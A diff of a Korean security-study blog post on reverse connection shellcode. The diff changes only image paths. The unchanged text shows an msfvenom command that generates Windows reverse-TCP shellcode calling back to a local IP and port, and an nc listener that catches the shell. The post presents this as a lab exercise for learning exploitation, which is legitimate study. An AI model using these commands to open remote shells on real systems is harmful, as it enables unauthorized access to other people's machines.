@@ -16,26 +16,26 @@ title: SUA 시스템 해킹 스터디 - 리버스 커넥션 쉘코드
 이번에도 마찬가지로, msfvenom을 이용해서 리버스 커넥션 쉘코드를 만들어 보자. Kali Linux에 로그인하고 터미널을 열어서 아래와 같이 msfvenom 명령어를 실행한다. 여기서 lhost 옵션은 자신의 IP를 입력한다. 결과적으로, 타겟 시스템에서 쉘코드 실행 시 입력한 IP와 포트로 쉘을 연결해 준다.
 
 <p style="text-align:center;">
-  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/rcs1.png" width="80%">
+  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/170924/rcs1.png" width="80%">
 </p>
 > `msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.7 lport=7777 -a x86 -f c --platform windows`
 
 위 쉘코드를 Visual Studio에서 실행시켜 보자. 실행하기 전에 먼저 원격(*자신의 PC*)에서 포트를 열고 대기한다. 여기서는 192.168.1.7 IP를 가진 PC에서 7777 포트를 열고 대기하며, 포트는 임의로 설정한다.
 
 <p style="text-align:center;">
-  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/rcs4.png" width="80%">
+  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/170924/rcs4.png" width="80%">
 </p>
 > `nc -l 7777`
 
 <p style="text-align:center;">
-  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/rcs2.png" width="80%">
+  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/170924/rcs2.png" width="80%">
 </p>
 > Visual Studio에서 빌드한 후, 실행시킨다.
 
 Visual Studio에서 실행시킨 결과, 아래처럼 정상적으로 자신의 PC에서 쉘에 접속되는 것을 확인할 수 있다. 모의해킹이나 실제 환경에서는 리버스 커넥션 쉘코드의 활용도가 높기 때문에 꼭 실습하고 이해하고 넘어가자.
 
 <p style="text-align:center;">
-  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/rcs3.png" width="80%">
+  <img src="https://raw.githubusercontent.com/henrychoi7/henrychoi7.github.io/master/img/170924/rcs3.png" width="80%">
 </p>
 
 Exploit을 작성하고 공격을 수행하다가 쉘코드가 제대로 실행되지 않는 경우가 있다. 공격에 사용했던 쉘코드가 실행되기 전에 메모리 상에서 변형되는 경우가 종종 있기 때문이다.
